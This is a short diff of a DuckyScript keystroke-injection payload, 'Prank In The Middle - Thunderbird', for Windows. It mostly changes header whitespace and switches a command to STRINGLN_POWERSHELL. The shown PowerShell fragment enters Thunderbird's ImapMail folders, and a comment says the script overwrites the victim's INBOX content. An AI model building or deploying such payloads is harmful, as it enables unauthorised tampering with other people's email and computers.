@@ -1,11 +1,11 @@
 REM #####################################################
-REM #                                     		#
+REM #                                     		        #
 REM # Title       : Prank In The Middle - Thunderbird   #
-REM # Author      : Aleff                 		#
-REM # Version	  : 1.0                   		#
-REM # Category	  : Prank                 		#
-REM # Target	  : Windows 10/11         		#
-REM #                                     		#
+REM # Author      : Aleff                 		        #
+REM # Version	  : 1.0                   		        #
+REM # Category	  : Prank                 		        #
+REM # Target	  : Windows 10/11         		        #
+REM #                                     		        #
 REM #####################################################
 
 EXTENSION DETECT_READY
@@ -81,7 +81,7 @@ ENTER
 DELAY 500
 
 REM Get the INBOX content and edit it overwriting. Then close the powershell
-STRINGLN
+STRINGLN_POWERSHELL
     cd ImapMail
     $directories = Get-ChildItem -Directory | Select-Object FullName
     foreach ($dir in $directories) {
